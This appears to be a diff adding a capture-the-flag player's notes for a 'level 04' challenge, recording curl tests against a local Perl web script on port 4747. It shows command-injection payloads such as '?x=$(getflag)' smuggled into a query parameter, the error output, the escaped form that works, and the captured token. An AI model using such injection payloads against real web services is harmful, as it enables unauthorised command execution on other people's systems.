@@ -1,0 +1,30 @@
+level 04 :
+check /etc/www/
+
+test:
+curl http://localhost:4747?ls => blank
+curl http://localhost:4747?x=ls => ls
+curl http://localhost:4747?x=$(ls) => level04.pl
+curl http://192.168.1.147:4747/?x=$(getflag) => Check
+curl: (6) Couldn't resolve host 'flag.Here'
+curl: (6) Couldn't resolve host 'is'
+curl: (6) Couldn't resolve host 'your'
+curl: (6) Couldn't resolve host 'token'
+curl: (6) Couldn't resolve host ''
+curl: (6) Couldn't resolve host 'Nope'
+curl: (6) Couldn't resolve host 'there'
+curl: (6) Couldn't resolve host 'is'
+curl: (6) Couldn't resolve host 'no'
+curl: (6) Couldn't resolve host 'token'
+curl: (6) Couldn't resolve host 'here'
+curl: (6) Couldn't resolve host 'for'
+curl: (6) Couldn't resolve host 'you'
+curl: (6) Couldn't resolve host 'sorry.'
+curl: (6) Couldn't resolve host 'Try'
+curl: (6) Couldn't resolve host 'again'
+
+curl http://localhost:4747\?x\=$\(getflag\) => Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+utils cmd : curl -G -d "x=<value>" http://localhost:4747/script.pl
+in web browser (?x=$(getflag)) => 
+
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
